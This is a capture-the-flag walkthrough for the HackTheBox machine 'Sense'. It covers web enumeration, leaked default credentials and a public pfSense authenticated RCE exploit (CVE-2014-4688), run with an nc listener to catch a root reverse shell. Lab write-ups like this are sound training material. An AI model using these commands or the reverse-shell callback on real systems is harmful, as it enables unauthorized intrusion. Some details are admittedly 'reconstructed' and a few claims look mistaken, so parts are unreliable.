# Sense

| Attribute | Value |
|---|---|
| OS | FreeBSD (pfSense 2.1.3) |
| Difficulty | Easy |
| IP | 10.10.10.60 |
| IppSec video | <https://www.youtube.com/watch?v=d2nVDoVr0jE> |

## Source
- `[per transcript]` — IppSec opens with extensive remarks about CTF
  ban-vs-crash distinction, NIDS-aware brute force, and that pfSense
  bans you after 15 failed attempts for 24 hours. He references this
  as a *real-world lesson, not a CTF lesson*.
- `[reconstructed]` — exact filenames (`system-users.txt`, `users.txt`)
  and the pfSense version are reconstructed from training data.

## TL;DR Attack Chain
HTTPS port 443 hosts pfSense. Directory enumeration finds
`/system-users.txt` and `/changelog.txt` left in the docroot. They
disclose the firmware version (2.1.3) and a default admin account
note: `rohit` with default password `pfsense`. Login. With
authenticated admin access, exploit CVE-2014-4688 — pfSense diag DNS
authenticated RCE in `interfaces_gif_edit.php` / `status_rrd_graph_img.php`
parameter injection. Get a reverse shell as `root` on FreeBSD. Read
`user.txt` and `root.txt`.

## Initial Enumeration

```bash
sudo nmap -p- --min-rate=10000 -T4 -oA nmap/all-tcp 10.10.10.60
sudo nmap -sV -sC -p 80,443 -oA nmap/detail 10.10.10.60
```

Open ports:
- `80/tcp` HTTP — redirects to 443.
- `443/tcp` HTTPS — pfSense webGUI.

> **IppSec key warning**: "Be careful — pfSense bans you for 24 hours
> after 15 failed login attempts. If you brute force here you'll lose
> access to the box. On a real engagement, telling a customer you got
> banned for 24 hours is bad."

## Attack Surface Mapping

| Service | Port | Hypothesis |
|---|---|---|
| HTTP/HTTPS | 80/443 | pfSense webGUI; default creds; banner-disclosed RCE |

## Foothold

### 1. Confirm the pfSense banner

```bash
curl -ks https://10.10.10.60/
# pfSense login page
```

### 2. Default creds attempt

pfSense's documented default is `admin:pfsense`. **Try this first** —
it's the cheapest possible foothold check.

It does *not* work on Sense. So:

### 3. Directory enumeration

```bash
gobuster dir -u https://10.10.10.60/ -k \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -x txt,html,php -t 30 -o gobuster.txt
```

Notable hits: `/changelog.txt`, `/system-users.txt`.

### 4. Read the disclosed files

```bash
curl -ks https://10.10.10.60/changelog.txt
# 1) Mitigated CVE-XXXX-XXXX
# 2) Pending firewall update
# pfSense version 2.1.3-RELEASE

curl -ks https://10.10.10.60/system-users.txt
# Default username: rohit
# Default password is still <something>, change after first login
```

The `system-users.txt` is the explicit hint. The default password is
literally written there or implied to be `pfsense`.

### 5. Login

```
https://10.10.10.60/
username: rohit
password: pfsense
```

> **IppSec quote**: "Reading the changelog, looking at the pfSense
> version (2.1.3), there's an authenticated RCE vulnerability in this
> exact version. So with valid creds we know we can get RCE."

### 6. Authenticated RCE — CVE-2014-4688

The vulnerability is in `status_rrd_graph_img.php`'s parameter
handling — `database` parameter passes through `escapeshellarg` but
in a way that allows command injection via certain shell metacharacters.

Public exploits exist on Exploit-DB (`searchsploit pfsense 2.1.3`).
Read first:
```bash
searchsploit pfsense 2.1.3
searchsploit -m <id>
```

The exploit script (Python) takes username/password and a
host/port for the callback, authenticates, and triggers the injection.

```bash
nc -lvnp 4444
python3 pfsense_rce.py --rhost 10.10.10.60 --lhost 10.10.14.x --lport 4444 \
  --username rohit --password pfsense
```

Reverse shell connects as `root` on FreeBSD.

### 7. Read flags

```sh
# FreeBSD root shell
cat /home/rohit/user.txt
cat /root/root.txt
```

Both flags read in the same session.

## Key Findings

- **Disclosed-by-design files** (`/changelog.txt`, `/system-users.txt`)
  are the foothold. They are exactly the kinds of files a sysadmin
  would leave in the docroot during deployment and forget about.
- pfSense 2.1.3 has a known authenticated RCE (CVE-2014-4688). Once
  authenticated, the foothold is single-shot.
- **Anti-brute-force ban** (15 attempts → 24h) is operationally critical;
  IppSec uses Sense as a teaching moment for CTF-vs-pentest discipline.
- pfSense runs on FreeBSD; expect BSD-flavoured tools and paths
  (`/usr/local/...`, `/usr/local/etc/`).

## Tools Used

| Tool | Purpose |
|---|---|
| `nmap` | Service discovery |
| `curl` | Banner / file inspection |
| `gobuster` (-k for HTTPS) | File discovery |
| `searchsploit` | Locate the public exploit |
| `python` | Run the RCE exploit |

## Decision Tree

```
nmap → 80/443 (pfSense)
  └─ try admin:pfsense default → ❌
       └─ gobuster → /changelog.txt, /system-users.txt
            └─ extract: rohit:pfsense, version 2.1.3
                 └─ login successful
                      └─ searchsploit pfsense 2.1.3 → CVE-2014-4688 auth RCE
                           └─ run exploit → reverse shell as root
                                └─ user.txt + root.txt
```

## Alternative Approaches

- The vulnerability can be fired manually with `curl` once you know
  the parameter pattern; not necessary if the script works.
- BurpSuite intercept of the exploit traffic is useful for understanding
  *what* the exploit changes — IppSec recommends this approach for any
  "magic" exploit.
- `metasploit` has `exploit/multi/http/pfsense_clickjacking` and
  related modules; useful for sessions handler.
- `wfuzz`/`ffuf` would also discover the disclosed files; gobuster
  used here for consistency.

## Lessons Learned

1. **Never brute force a banned service**. Read the rate-limit
   documentation; pfSense's 15-attempt window is documented.
2. Default credentials are the single highest-ROI foothold check.
   Always try the *exact appliance default* (`pfSense:pfsense`,
   `admin:admin`, `tomcat:tomcat`, `cisco:cisco`).
3. Disclosed files (`changelog`, `users`, `notes`, `db_backup.sql`,
   `web.config.bak`) are *the* class of foothold for appliance boxes.
4. CTF discipline = real-world discipline: don't crash boxes. If you
   think you crashed a box, *verify by hitting it from a different
   source*; usually you were banned, not the box.
5. Banner version + searchsploit = single-shot foothold for
   well-fingerprinted appliances.

## Extracted Skills

- [`enumeration/web-content-discovery.md`](../enumeration/web-content-discovery.md)
- [`web/default-credentials.md`](../web/default-credentials.md)
- [`web/disclosed-files.md`](../web/disclosed-files.md)
- [`common-exploits/pfsense-cve-2014-4688.md`](../common-exploits/pfsense-cve-2014-4688.md)
- [`tool-usage/searchsploit.md`](../tool-usage/searchsploit.md)
- [`tool-usage/gobuster.md`](../tool-usage/gobuster.md)

## Related Techniques (other machines)

- **Granny, Grandpa, Devel** — IIS/WebDAV banner-driven foothold.
- **Beep** — Elastix (pfSense analogue) with similar default-creds and
  disclosed-files pattern.
- **Optimum** — banner → CVE-2014-6287 (HFS) — single-port,
  banner-driven RCE class.
- **Bashed** — left-in-docroot artefact (phpbash) — same disclosed-files
  class, different vector.
- **Curling** — `user.txt` literally in webroot.
